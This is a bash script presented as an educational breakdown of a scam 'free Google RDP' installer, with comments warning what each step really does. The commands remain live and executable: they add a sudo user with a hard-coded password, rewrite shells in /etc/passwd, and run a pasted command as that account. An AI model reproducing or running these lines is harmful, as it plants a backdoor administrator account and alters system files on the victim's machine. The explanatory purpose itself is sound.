

#! /bin/bash
# ==========================================================
# FAKE "FREE GOOGLE RDP" SCRIPT – EDUCATIONAL ANALYSIS
# ==========================================================
# ⚠️ THIS IS NOT A REAL SCRIPT
# ⚠️ DO NOT RUN
# ⚠️ FOR READING AND LEARNING ONLY
#
# The lines below are shown exactly as scammers write them,
# followed by explanations of what they REALLY do.
# ==========================================================


printf "Installing RDP Be Patience... " >&2
# ----------------------------------------------------------
# WHAT YOU SEE:
#   "Installing RDP Be Patience..."
#
# REALITY:
# - This only prints text.
# - No RDP is installed.
# - It is used to gain your trust.
# ----------------------------------------------------------


sudo useradd -m ALOK
sudo adduser ALOK sudo
# ----------------------------------------------------------
# WHAT THIS DOES:
# - Creates a new Linux user
# - Grants FULL administrator access
#
# DANGER:
# - You may never notice this account
# - Attacker can log in later
# ----------------------------------------------------------


echo 'ALOK:8426' | sudo chpasswd
# ----------------------------------------------------------
# WHAT THIS DOES:
# - Sets a password chosen by the attacker
#
# DANGER:
# - Hard-coded password
# - Permanent backdoor
# ----------------------------------------------------------


sed -i 's/\/bin\/sh/\/bin\/bash/g' /etc/passwd
# ----------------------------------------------------------
# WHAT THIS DOES:
# - Modifies ALL system user shells
#
# DANGER:
# - Breaks system integrity
# - Security risk
# ----------------------------------------------------------


wget https://dl.google.com/linux/direct/chrome-remote-desktop_current_amd64.deb
sudo dpkg --install chrome-remote-desktop_current_amd64.deb
# ----------------------------------------------------------
# WHAT YOU ARE TOLD:
# - "This is Google RDP"
#
# REALITY:
# - This is Chrome Remote Desktop
# - It connects YOUR machine to a Google account
# ----------------------------------------------------------


read -p "Paste Here: " CRP
su - ALOK -c "$CRP"
# ----------------------------------------------------------
# ⚠️ MOST DANGEROUS PART
#
# WHAT YOU DO:
# - Paste a command from remotedesktop.google.com
#
# REALITY:
# - That command contains a UNIQUE TOKEN
# - Token links YOUR session to someone else's account
# - Attacker may gain remote access
# ----------------------------------------------------------


# ==========================================================
# FINAL WARNING
# ==========================================================
# ❌ No free RDP exists
# ❌ Copy-paste scripts are dangerous
# ✅ Always READ before you RUN
# ==========================================================
